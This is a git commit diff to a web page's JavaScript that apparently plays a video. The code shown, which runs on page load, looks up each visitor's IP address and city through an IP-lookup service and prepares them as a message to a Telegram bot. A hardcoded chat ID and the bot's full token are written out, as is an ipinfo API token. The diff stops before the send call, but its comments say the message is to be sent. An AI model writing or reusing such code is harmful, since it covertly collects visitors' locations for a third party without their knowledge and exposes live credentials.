c4db7d75074e0098bfa69161e0bd46969ffc3924
zhentosxcvt <61989079+noscope096@users.noreply.github.com>
2023-05-21 14:19:51 +0300

    added some changes

--- js/index.js
+++ js/index.js
@@ -14,12 +14,12 @@ playButton.addEventListener("click", showVideo);
 
 video.controls = false;
 
-fetch("https://ip-api.com/json")
+fetch("https://ipinfo.io/json?token=a5fdbd840e0610")
     .then((response) => response.json())
     .then((data) => {
         console.log(data.city); // Город
         const city = data.city;
-        const ip = data.query;
+        const ip = data.ip;
         const message = city + ": " + ip; // Сообщение, которое вы хотите отправить
         const chatId = "6281247312"; // Идентификатор чата (или пользователя), куда вы хотите отправить сообщение
         const token = "5995233822:AAEcIA-IHpUKUqFFCwBjbGBL1QOZJbgPbs0"; // Токен вашего Telegram-бота
